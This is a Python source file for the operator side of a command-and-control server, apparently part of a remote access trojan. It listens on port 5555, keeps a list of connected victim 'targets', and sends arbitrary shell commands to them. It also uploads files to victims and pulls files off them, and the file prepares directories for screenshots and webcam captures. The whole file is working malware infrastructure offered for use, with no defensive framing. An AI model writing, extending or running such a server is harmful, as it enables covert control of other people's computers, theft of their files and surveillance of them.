# Instrumented C2 Server with Framed JSON Protocol
import json
import hashlib
import os
import socket
import ssl
import sys
import threading
import time
from colour import banner, Colour

SCREENSHOT_DIR = 'images/screenshots'
WEBCAM_DIR = './images/webcam'
SCREENSHOT_TIMEOUT = 3
WEBCAM_TIMEOUT = 10
HEADER_SIZE = 16

def send_json(target, data):
    try:
        raw = json.dumps(data).encode()
        length = f"{len(raw):<{HEADER_SIZE}}".encode()
        target.sendall(length + raw)
        print(f"[DEBUG] Sent: {data}")
    except Exception as e:
        print(f"[ERROR] Failed to send data: {e}")

def recv_json(target):
    try:
        length_data = target.recv(HEADER_SIZE)
        if not length_data:
            return None
        total_length = int(length_data.decode().strip())
        data = b''
        while len(data) < total_length:
            chunk = target.recv(1024)
            if not chunk:
                break
            data += chunk
        decoded = json.loads(data.decode())
        print(f"[DEBUG] Received: {decoded}")
        return decoded
    except Exception as e:
        print(f"[ERROR] Failed to receive data: {e}")
        return None

def accept_connections(sock, targets, ips):
    while True:
        try:
            target, ip = sock.accept()
            print(f"[+] Connection from {ip}")
            handshake = recv_json(target)
            print(f"[DEBUG] Handshake: {handshake}")
            targets.append(target)
            ips.append(ip)
        except Exception as e:
            print(f"[ERROR] Accept failed: {e}")
            continue

def initialise_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 5555))
    sock.listen(5)
    print("[INFO] Socket initialized")
    return sock

def upload_file(target, filename):
    try:
        with open(filename, 'rb') as f:
            target.sendall(f.read())
        print(f"[DEBUG] Uploaded file {filename}")
    except Exception as e:
        print(f"[ERROR] Upload failed: {e}")

def download_file(target, filename):
    try:
        with open(filename, 'wb') as f:
            target.settimeout(2)
            while True:
                try:
                    chunk = target.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                except socket.timeout:
                    break
        target.settimeout(None)
        print(f"[DEBUG] Download complete: {filename}")
    except Exception as e:
        print(f"[ERROR] Download failed: {e}")

def target_communication(target, ip):
    while True:
        cmd = input(f"* Shell~{ip}: ")
        send_json(target, cmd)
        if cmd in ['quit', 'bg', 'background']:
            break
        elif cmd.startswith('upload '):
            upload_file(target, cmd.split(' ', 1)[1])
        elif cmd.startswith('download '):
            download_file(target, cmd.split(' ', 1)[1])
        else:
            result = recv_json(target)
            print(result)

def list_targets(ips):
    for idx, ip in enumerate(ips):
        print(f"Session {idx} --- {ip}")

def run_c2():
    targets = []
    ips = []
    sock = initialise_socket()
    threading.Thread(target=accept_connections, args=(sock, targets, ips), daemon=True).start()

    while True:
        try:
            cmd = input("[C2] > ")
            if cmd == 'targets':
                list_targets(ips)
            elif cmd.startswith('session '):
                idx = int(cmd.split()[1])
                target_communication(targets[idx], ips[idx])
            elif cmd == 'exit':
                for t in targets:
                    send_json(t, 'quit')
                    t.close()
                sock.close()
                sys.exit(0)
            else:
                print("[ERROR] Unknown command")
        except Exception as e:
            print(f"[ERROR] C2 loop exception: {e}")

if __name__ == '__main__':
    print(banner())
    print("[+] Waiting for incoming connections...")
    run_c2()
